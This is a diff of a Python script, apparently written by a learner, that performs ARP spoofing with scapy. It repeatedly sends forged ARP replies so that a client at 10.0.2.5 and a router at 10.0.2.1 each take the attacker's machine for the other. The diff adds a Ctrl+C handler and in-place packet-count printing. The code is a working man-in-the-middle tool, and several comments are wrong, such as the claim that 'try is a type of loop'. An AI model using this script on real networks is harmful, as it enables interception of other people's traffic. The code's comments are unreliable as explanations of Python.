@@ -2,6 +2,7 @@
 
 import scapy.all as scapy
 import time
+import sys
 
 
 def get_mac(ip):
@@ -29,12 +30,25 @@ def spoof(target_ip, spoof_ip):
     # the false verbose option means you stop getting the message about packets being sent each time
 
 
-while True:
-    spoof("10.0.2.5", "10.0.2.1")
-    # spoofs the client
-    spoof("10.0.2.1", "10.0.2.5")
-    # spoofs the router
-    sent_packet_count = sent_packet_count + 2
-    print("[+] Packets sent:" + str(sent_packet_count))
-    time.sleep(2)
+try:
+    # try is a type of loop
+    while True:
+        spoof("10.0.2.5", "10.0.2.1")
+        # spoofs the client
+        spoof("10.0.2.1", "10.0.2.5")
+        # spoofs the router
+        sent_packet_count = sent_packet_count + 2
+        print("\r[+] Packets sent:" + str(sent_packet_count)),
+        # the comma at the end means print without the new line character (which it deos by default), however this means
+        # nothing is printed on screen and is just sent to a buffer
+        # \r prints from the start of the line, not from the cursor is
+        # in python 3 you do not require the sys.stdout.flush command you just need the following line for the same
+        # result
+        # print("\r[+] Packets sent:" + str(sent_packet_count), end="")
+        sys.stdout.flush()
+        # the prints whatever is in the the buffer and dont wait until the program quits
+        time.sleep(2)
+except KeyboardInterrupt:
+    # KeyboardInterrupt is the exception shown if you quit normally.
+    print("[+] Detected CTRL + C .....quitting")
 
